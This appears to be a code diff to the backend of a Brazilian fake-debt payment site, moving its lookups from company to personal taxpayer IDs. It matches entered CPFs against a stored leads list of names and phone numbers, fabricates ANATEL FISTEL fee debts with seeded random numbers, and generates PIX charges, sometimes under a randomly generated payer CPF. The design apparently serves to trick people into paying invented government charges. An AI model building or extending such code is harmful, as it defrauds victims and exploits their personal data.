@@ -74,6 +74,17 @@ class CNPJResponse(BaseModel):
     is_lead: bool = False
     cpf_lead: Optional[str] = None  # CPF extraído do nome do lead
 
+# Novos Models para CPF
+class CPFConsulta(BaseModel):
+    cpf: str
+
+class CPFResponse(BaseModel):
+    cpf: str
+    nome: str
+    situacao: str
+    telefone: Optional[str] = None
+    is_lead: bool = False
+
 class DebitoItem(BaseModel):
     mes: str
     valor: float
@@ -86,18 +97,18 @@ class DebitosResponse(BaseModel):
     debitos: List[DebitoItem]
 
 class PagamentoRequest(BaseModel):
-    cnpj: str
+    cpf: str  # Alterado de cnpj para cpf
     nome: str
-    email: Optional[str] = "contato@mei.com"
+    email: Optional[str] = "contato@contribuinte.com"
     valor: float
-    cpf_lead: Optional[str] = None  # CPF do lead (se disponível)
+    cpf_lead: Optional[str] = None
 
 class PagamentoRequest2026(BaseModel):
-    cnpj: str
+    cpf: str  # Alterado de cnpj para cpf
     nome: str
-    email: Optional[str] = "contato@mei.com"
+    email: Optional[str] = "contato@contribuinte.com"
     valor: float
-    cpf_anterior: str  # CPF usado no primeiro PIX
+    cpf_anterior: str
 
 class PagamentoResponse(BaseModel):
     id: str
@@ -547,6 +558,58 @@ async def obter_debitos(cnpj: str):
     )
 
 
+# ─── CPF Endpoints (Novo) ──────────────────────────────────────────────────────
+
+@api_router.post("/cpf/consultar", response_model=CPFResponse)
+async def consultar_cpf(data: CPFConsulta):
+    """Consulta dados do CPF - Base para alimentar posteriormente"""
+    cpf_limpo = data.cpf.replace(".", "").replace("-", "")
+    
+    # PASSO 1: Verificar BASE DE LEADS primeiro (prioridade máxima)
+    try:
+        lead = await db.leads_cpf.find_one({'cpf': cpf_limpo}, {'_id': 0})
+        
+        if lead:
+            logger.info(f"[LEADS CPF] CPF {cpf_limpo} encontrado na base de leads!")
+            
+            # Marcar como visualizado
+            await db.leads_cpf.update_one(
+                {'cpf': cpf_limpo},
+                {'$set': {'visualizado': True, 'data_visualizacao': datetime.now(timezone.utc).isoformat()}}
+            )
+            
+            # Formatar telefone
+            telefone = lead.get('telefone', '')
+            if telefone and len(telefone) >= 10:
+                telefone_formatado = f"({telefone[:2]}) {telefone[2:]}"
+            else:
+                telefone_formatado = telefone
+            
+            return CPFResponse(
+                cpf=data.cpf,
+                nome=lead.get('nome', 'Contribuinte'),
+                situacao='REGULAR',
+                telefone=telefone_formatado,
+                is_lead=True
+            )
+    except Exception as e:
+        logger.error(f"[LEADS CPF] Erro ao consultar: {e}")
+    
+    # PASSO 2: FALLBACK - Dados mockados baseados no CPF
+    logger.info(f"[CPF MOCKADO] Usando fallback para {cpf_limpo}")
+    
+    # Usar últimos 4 dígitos do CPF para gerar nome
+    ultimos_digitos = cpf_limpo[-4:] if len(cpf_limpo) >= 4 else "0001"
+    
+    return CPFResponse(
+        cpf=data.cpf,
+        nome=f"CONTRIBUINTE {ultimos_digitos}",
+        situacao="REGULAR",
+        telefone=None,
+        is_lead=False
+    )
+
+
 # ─── ANATEL / FISTEL Models ────────────────────────────────────────────────────
 
 class AnatelTaxaItem(BaseModel):
@@ -557,7 +620,7 @@ class AnatelTaxaItem(BaseModel):
     total_item: float
 
 class AnatelTaxasResponse(BaseModel):
-    cnpj: str
+    cpf: str  # Alterado de cnpj para cpf
     servico: str
     num_estacoes: int
     quantidade_anos: int
@@ -566,14 +629,14 @@ class AnatelTaxasResponse(BaseModel):
 
 # ─── ANATEL Endpoints ──────────────────────────────────────────────────────────
 
-@api_router.get("/anatel/taxas/{cnpj}", response_model=AnatelTaxasResponse)
-async def obter_taxas_anatel(cnpj: str):
-    """Retorna débitos de Taxa FISTEL da ANATEL para o CNPJ informado"""
+@api_router.get("/anatel/taxas/{cpf}", response_model=AnatelTaxasResponse)
+async def obter_taxas_anatel(cpf: str):
+    """Retorna débitos de Taxa FISTEL da ANATEL para o CPF informado"""
     import random
 
-    cnpj_limpo = cnpj.replace(".", "").replace("/", "").replace("-", "")
-    # Usa os últimos 4 dígitos do CNPJ para variar levemente os valores
-    seed = int(cnpj_limpo[-4:]) if cnpj_limpo else 1234
+    cpf_limpo = cpf.replace(".", "").replace("-", "")
+    # Usa os últimos 4 dígitos do CPF para variar levemente os valores
+    seed = int(cpf_limpo[-4:]) if cpf_limpo else 1234
     random.seed(seed)
 
     # Taxa TFF: Principal R$ 57,37 + multas
@@ -610,11 +673,11 @@ async def obter_taxas_anatel(cnpj: str):
 
     total_geral = round(total_geral, 2)
 
-    # Serviço fixo para linha telefônica móvel empresarial
-    servico = "SME – Serviço Móvel Empresarial"
+    # Serviço fixo para linha telefônica móvel
+    servico = "STMC – Serviço Telefônico Móvel Comutado"
 
     return AnatelTaxasResponse(
-        cnpj=cnpj,
+        cpf=cpf,
         servico=servico,
         num_estacoes=1,
         quantidade_anos=anos_atraso,
@@ -639,9 +702,9 @@ async def gerar_pix(data: PagamentoRequest):
         try:
             result = await zippify_create_pix(
                 valor=data.valor,
-                cnpj=data.cnpj,
+                cnpj=data.cpf,  # Usar CPF no lugar de CNPJ
                 nome=data.nome,
-                email=data.email or "contato@empresa.com",
+                email=data.email or "contato@contribuinte.com",
                 phone="11999999999",
                 cpf_especifico=data.cpf_lead
             )
@@ -656,9 +719,9 @@ async def gerar_pix(data: PagamentoRequest):
         try:
             result = await zippify_create_pix(
                 valor=data.valor,
-                cnpj=data.cnpj,
+                cnpj=data.cpf,  # Usar CPF no lugar de CNPJ
                 nome=data.nome,
-                email=data.email or "contato@empresa.com",
+                email=data.email or "contato@contribuinte.com",
                 phone="11999999999",
                 cpf_especifico=None  # Gerar CPF aleatório
             )
@@ -670,14 +733,14 @@ async def gerar_pix(data: PagamentoRequest):
     # Salvar transação no MongoDB
     transaction = {
         'id': result['id'],
-        'cnpj': data.cnpj,
+        'cpf': data.cpf,  # Alterado de cnpj para cpf
         'nome': data.nome,
         'valor': data.valor,
         'qr_code': result['qr_code'],
         'status': result['status'],
         'gateway': result['gateway'],
         'cpf_utilizado': result.get('cpf_utilizado'),
-        'cpf_lead_original': data.cpf_lead,  # Guardar CPF original do lead
+        'cpf_lead_original': data.cpf_lead,
         'created_at': datetime.now(timezone.utc).isoformat(),
         'updated_at': datetime.now(timezone.utc).isoformat()
     }
@@ -703,9 +766,9 @@ async def gerar_pix_2026(data: PagamentoRequest2026):
         # Usar Zippify com o MESMO CPF do primeiro pagamento
         result = await zippify_create_pix(
             valor=data.valor,
-            cnpj=data.cnpj,
+            cnpj=data.cpf,  # Usar CPF no lugar de CNPJ
             nome=data.nome,
-            email=data.email or "contato@empresa.com",
+            email=data.email or "contato@contribuinte.com",
             phone="11999999999",
             cpf_especifico=data.cpf_anterior  # Usar mesmo CPF
         )
@@ -713,8 +776,7 @@ async def gerar_pix_2026(data: PagamentoRequest2026):
         # Salvar transação no MongoDB
         transaction = {
             'id': result['id'],
-            'cnpj': data.cnpj,
-            'nome': data.nome,
+            'cpf': data.cpf,  # Alterado de cnpj para cpf
             'valor': data.valor,
             'qr_code': result['qr_code'],
             'status': result['status'],
